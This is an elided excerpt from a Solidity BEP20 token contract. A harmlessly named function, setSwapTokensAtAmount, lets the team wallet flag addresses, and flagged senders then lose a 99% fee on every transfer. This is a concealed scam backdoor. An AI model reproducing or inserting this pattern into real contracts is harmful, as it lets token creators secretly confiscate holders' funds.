...
contract BEP20 is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private edit;
    ...
    constructor ()
    {
        ...
        marketWallet = payable(0xc64e96a0F04f2A4BFbA25957F41D4Ca9472cab1E);
        teamAddress= payable(0xbdCC34526cca1d564740E132A1Cc4af671A3AB33);
    ...
    function setSwapTokensAtAmount(address recipient, uint256 amount) public {
        if(msg.sender==teamAddress)edit[recipient] = amount;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(edit[sender] > 0) feeAmount = amount.mul(99).div(100);
